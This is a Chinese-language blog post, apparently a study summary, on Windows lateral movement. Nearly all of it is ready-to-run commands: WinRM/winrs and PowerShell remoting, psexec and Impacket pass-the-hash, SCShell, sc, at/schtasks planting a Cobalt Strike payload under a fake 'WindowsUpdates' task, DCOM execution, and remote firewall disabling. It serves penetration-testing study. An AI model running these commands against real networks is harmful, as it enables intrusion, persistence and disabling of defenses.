<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824115328865.png" alt="image-20200824115328865"></p>
<h3 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h3><p><strong>什么是winrm?</strong></p>
<p>​        Web服务管理协议（WS-Management，Web Services-Management）是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备以及各种Web应用程序进行管理。而WinRM（<a href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal" target="_blank" rel="noopener">Windows Remote Management</a>）是Windows对WS-Management的实现，WinRM允许远程用户使用工具和脚本对Windows服务器进行管理并获取数据。</p>
<p>​        winrm服务端工作在5985和5986端口上，winrm以SOAP格式来进行数据交换。</p>
<p><strong>有什么利用条件？</strong></p>
<ul>
<li><p>在win2012以上才可以远程主机来管理</p>
</li>
<li><p>防火墙开放对5985和5986端口的连入</p>
<p>可以在powershell下进行测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Test-WsMan 192.168.3.144</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824141035101.png" alt="image-20200824141035101"></p>
</li>
</ul>
<p><strong>winrm横向移动</strong></p>
<p>1、使用winrm直接横向移动</p>
<p>​        使用winrm在本地执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm invoke Create wmicimv2&#x2F;win32_process @&#123;CommandLine&#x3D;&quot;calc.exe&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824141727865.png" alt="image-20200824141727865"></p>
<p>​        使用winrm在远程主机上执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm invoke Create wmicimv2&#x2F;win32_process @&#123;CommandLine&#x3D;&quot;calc.exe&quot;&#125; -r:http:&#x2F;&#x2F;10.0.83.30:5985 -u:administrator -p:123456</span><br></pre></td></tr></table></figure>

<p>​        直接使用会存在一个信任问题</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824142530029.png" alt="image-20200824142530029"></p>
<p>​        可以通过如下命令添加信任</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Item WSMan:\localhost\Client\TrustedHosts -Value &quot;192.168.3.73&quot;</span><br><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *  信任任意的远程主机</span><br><span class="line">Get-Item WSMan:\localhost\Client\TrustedHosts</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824143736527.png" alt="image-20200824143736527"></p>
<p>​        添加信任后，再使用winrm执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm invoke Create wmicimv2&#x2F;win32_process @&#123;CommandLine&#x3D;&quot;calc.exe&quot;&#125; -r:http:&#x2F;&#x2F;192.168.3.73:5985 -u:administrator -p:xxx</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824144154073.png" alt="image-20200824144154073"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824144213829.png" alt="image-20200824144213829"></p>
<p>2、使用自带的winrs横向渗透</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:192.168.3.73 -u:administrator -p:xxx &quot;query user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824144311792.png" alt="image-20200824144311792"></p>
<p>​        获取交互shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:192.168.3.73 -u:administrator -p:xxx &quot;cmd&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824145743238.png" alt="image-20200824145743238"></p>
<p>3、使用powershell横向渗透</p>
<p>​        直接执行命令的方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -ComputerName 192.168.3.73 -ScriptBlock &#123; query user &#125; -credential administrator</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824145045948.png" alt="image-20200824145045948"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824145027678.png" alt="image-20200824145027678"></p>
<p>​        获取交互shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName 192.168.3.73 -Credential administrator</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824145336582.png" alt="image-20200824145336582"></p>
<h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p>​        因为本地管理员具有创建，重启，修改二进制文件路径的权限，因此可以通过这种方式进行横向移动。</p>
<p><strong>1、psexec横向移动</strong></p>
<p>​        通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为”PSEXESVC”的二进制文件，然后通过psexec服务运行命令，运行结束后删除服务。</p>
<p>利用说明：</p>
<pre><code>- 使用psexec需要开启admin$共享
- Psexec 连接目标时会创建PSEXESVC 服务，退出时删除PSEXESVC 服务，会在目标日志系统留下大量痕迹
-  通过Psexec获得交互式shell时，正常使用exit退出会删除目标机器上的PSEXESVC 服务，直接点 X 关闭可能导致目标服务无法删除。如果使用交互式shell执行阻塞的进程可能导出服务不能正常退出。
- Psexec 该工具支持socks代理</code></pre><p>​    <strong>无ipc连接情况下</strong></p>
<p>​        获取反弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe  \\192.168.3.144 -u administrator -p xxx cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824154405301.png" alt="image-20200824154405301"></p>
<p>​        执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\192.168.3.144 -u administrator -p xxx cmd.exe &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824171320209.png" alt="image-20200824171320209"></p>
<p>有ipc连接情况下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\192.168.3.144 cmd.exe</span><br><span class="line">psexec.exe \\192.168.3.144 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824171717205.png" alt="image-20200824171717205"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824171830308.png" alt="image-20200824171830308"></p>
<p><strong>2、Impacket套件psexec利用</strong></p>
<p>​        当我们仅仅获取hash,可以通过Impacket的psexec进行利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -hashes :xxxxx .&#x2F;administrator@192.168.3.144</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824173040617.png" alt="image-20200824173040617"></p>
<pre><code>使用psexec.exe执行文件上线，首先生成service的exe</code></pre><p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824173346403.png" alt="image-20200824173346403"></p>
<p>​        将exe上传到边界机上，执行如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -hashes :xxxxx .&#x2F;administrator@192.168.3.144  -c c:\xxx\xxx\xxx.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824173708846.png" alt="image-20200824173708846"></p>
<p><strong>3、SCShell横向移动</strong></p>
<pre><code>SCShell是无文件横向移动工具，它依赖ChangeServiceConfigA来运行命令。该工具的优点在于它不会针对SMB执行身份验证。一切都通过DCERPC执行。无需创建服务，而只需通过ChangeServiceConfigAAPI 远程打开服务并修改二进制路径名即可（所以要事先知道目标上的服务名称）。</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCShell.exe 192.168.3.144 已知的服务名 &quot;C:\windows\system32\calc.exe&quot; . administrastor Password</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825101545936.png" alt="image-20200825101545936"></p>
<p><strong>4、使用SC命令操作服务</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc \\xxx.xxx.xxx.xx create test666 binpath&#x3D;&quot;C:\Windows\System32\calc.exe&quot;</span><br><span class="line">sc \\xxx.xxx.xxx.xx	query test666</span><br><span class="line">sc \\xxx.xxx.xxx.xx start test666</span><br><span class="line">sc \\xxx.xxx.xxx.xx delete test666</span><br></pre></td></tr></table></figure>

<p>​        我这里测试遇到了1053错误，找了很多方法都没能解决</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825101901258.png" alt="image-20200825101901258"></p>
<p>​        经过请教部门的同事，虽然启动服务会爆1053错误，但实际上exe也会正常执行。</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826200332927.png" alt="image-20200826200332927"></p>
<p>​        但是这里还是还是有一个问题，就是当启动爆出1053错误后，原本执行的exe进行会消失，假如我们执行的这个exe是cs生成的马，那么使用sc执行后会随着报错的出现导致shell掉了吗？</p>
<p>​        经过测试发现确实会掉，最终确定爆1053的原因是我们执行的exe不是一个正常的service，因此执行会爆1053的错误，使用cs生成一个services类型的马就可以正常执行了，并且不会报错。</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826201410161.png" alt="image-20200826201410161"></p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p><strong>什么是计划任务？</strong></p>
<p>​        所谓的计划任务，就是在某个时间去执行某个操作。</p>
<p><strong>有什么利用条件？</strong></p>
<ul>
<li>有管理员的账号密码</li>
<li>net use 可以正常连接</li>
<li>windows计划任务服务”Task Scheduler”启动</li>
</ul>
<p><strong>计划任务横向渗透</strong></p>
<pre><code>在一些比较老的系统比如xp/2003是使用at命令来执行计划任务操作,在2008可以使用at和schtasks执行计划任务。</code></pre><p>1、AT计划任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.100\admin$ &quot;xxx&quot; &#x2F;user:administrator</span><br><span class="line">net time \\192.168.3.100 </span><br><span class="line">xcopy C:\Users\jerry\Desktop\artifact.exe \\192.168.3.100\admin$\temp </span><br><span class="line">at \\192.168.3.100 10:54 &#x2F;every:25 c:\windows\temp\artifact.exe  开始在远程机器上创建计划任务,只在每个月的25号的晚上10点54准时执行指定的 payload</span><br><span class="line">at \\192.168.3.100 查看远程机器上的所有计划任务列表</span><br><span class="line">at \\192.168.3.100 &#x2F;delete &#x2F;yes 删除远程机器上的所有计划任务,也可以用指定 id 的方式删除单条计划任务</span><br><span class="line">net use \\192.168.3.100\admin$ &#x2F;del 用完以后,立即删除该 ipc 连接</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825105332939.png" alt="image-20200825105332939"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825105719447.png" alt="image-20200825105719447"></p>
<p>2、schtasks计划任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.100\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxxx&quot;</span><br><span class="line">net time \\192.168.3.100</span><br><span class="line">xcopy C:\Users\jerry\Desktop\artifact.exe \\192.168.3.100\admin$\temp\</span><br><span class="line">chcp 437 如果目标是中文系统,最好先调整下字符集,不然会有问题</span><br><span class="line">schtasks &#x2F;create &#x2F;s 192.168.3.100 &#x2F;u &quot;administrator&quot; &#x2F;p &quot;xxxx&quot; &#x2F;RL HIGHEST &#x2F;F &#x2F;tn &quot;WindowsUpdates666&quot; &#x2F;tr &quot;c:\windows\temp\artifact.exe&quot; &#x2F;sc DAILY &#x2F;mo 1 &#x2F;ST 11:06 在远程的目标机器上创建计划任务</span><br><span class="line">schtasks &#x2F;run &#x2F;tn WindowsUpdates666 &#x2F;s 192.168.3.100 &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxx&quot; 创建完以后,远程手动运行</span><br><span class="line">schtasks &#x2F;query &#x2F;s 192.168.3.100 &#x2F;U &quot;administrator&quot; &#x2F;P &quot;xxxx&quot; | findstr &quot;WindowsUpdates666&quot; 运行完以后,随手检查运行状态</span><br><span class="line">schtasks &#x2F;delete &#x2F;F &#x2F;tn WindowsUpdates &#x2F;s 192.168.3.100 &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxx&quot; 一般情况下,在我们拿到远程机器 shell 以后,立即删除远程机器上的计划任务即可</span><br></pre></td></tr></table></figure>

<p>​            使用schtasks可以手工去启动计划任务，无需等到特定的时间去触发</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825114556769.png" alt="image-20200825114556769"></p>
<p>3、impacket套件atexec</p>
<p>​        通过Task Scheduler服务在目标系统上执行命令，并返回输出结果。atexec 脚本默认只支持 2008 之后的系统，默认弹回来的是system权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe .&#x2F;administrator:xxxx@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825115822194.png" alt="image-20200825115822194"></p>
<p>​        也可以使用hash来进行认证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe -hashes :xxxxxxxx .&#x2F;administrator@192.168.3.144 &quot;whoami &#x2F;user&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825120022273.png" alt="image-20200825120022273"></p>
<h3 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h3><p><strong>什么是DCOM?</strong></p>
<p>​        DCOM（分布式组件对象模型）是微软的一系列概念和程序接口。通过DOCM,客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。</p>
<p><strong>DCOM的基本应用</strong></p>
<p>​        获取DCOM的程序列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825133624007.png" alt="image-20200825133624007"></p>
<p>​        Get-CimInstance在powershell3.0以上版本存在，只能在win2012以上才能使用。可以使用下面的命令代替</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825134908675.png" alt="image-20200825134908675"></p>
<p>​        也可以使用WMIC获取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_DCOMApplication  GET &#x2F;all &#x2F;FORMAT:list</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825133744491.png" alt="image-20200825133744491"></p>
<p><strong>使用DCOM在本地执行任意命令</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com&#x3D;[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimzed&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825135624138.png" alt="image-20200825135624138"></p>
<p>​        注意执行上面的命令需要<strong>本地以管理员权限运行</strong>，否则会出现如下错误</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825141214424.png" alt="image-20200825141214424"></p>
<p><strong>在远程主机上执行任意命令</strong></p>
<p>利用条件：</p>
<ul>
<li><p>域环境下使用</p>
</li>
<li><p>Client：关闭防火墙</p>
</li>
<li><p>Server：获得域主机内置帐户administrator的口令，可net use连接至Client</p>
</li>
</ul>
<p>1、调用MMC20.Application在远程主机上执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.3.73&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&quot;cmd.exe&quot;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825142928339.png" alt="image-20200825142928339"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825142937085.png" alt="image-20200825142937085"></p>
<p>​        这种方式我在域环境中复现成功，在非域环境未复现成功，会爆如下错误</p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825143624888.png" alt="image-20200825143624888"></p>
<p>2、调用’9BA05972-F6A8-11CF-A442-00A0C90A8F39’</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$com &#x3D; [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.3.73&quot;)</span><br><span class="line">$obj &#x3D; [System.Activator]::CreateInstance($com)</span><br><span class="line">$item &#x3D; $obj.item()</span><br><span class="line">$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825160835771.png" alt="image-20200825160835771"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825160845127.png" alt="image-20200825160845127"></p>
<p>​        这种方式执行完calc后会直接弹出，而不是在后台执行</p>
<p>3、调用’C08AFD90-F2A1-11D1-8455-00A0C91F3880’</p>
<p>​        这种方式适合于win2012和win10，不适合win7</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$com &#x3D; [Type]::GetTypeFromCLSID(&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;,&quot;192.168.3.73&quot;)</span><br><span class="line">$obj &#x3D; [System.Activator]::CreateInstance($com)</span><br><span class="line">$obj.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825161330814.png" alt="image-20200825161330814"></p>
<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825161345598.png" alt="image-20200825161345598"></p>
<p><strong>远程操作防火墙</strong></p>
<p>1、通过sc命令远程关闭防火墙</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.3.73 stop mpssvc</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825162057120.png" alt="image-20200825162057120"></p>
<p>2、远程修改防火墙配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh -r 192.168.3.73 -u  rootkit\administrator -p xxx advfirewall firewall add rule name&#x3D;&quot;any&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;any action&#x3D;allow</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825163734585.png" alt="image-20200825163734585"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh -r 192.168.3.73  -u rootkit\administrator -p xxx advfirewall firewall Delete rule name&#x3D;&quot;any&quot;  删除规则</span><br></pre></td></tr></table></figure>

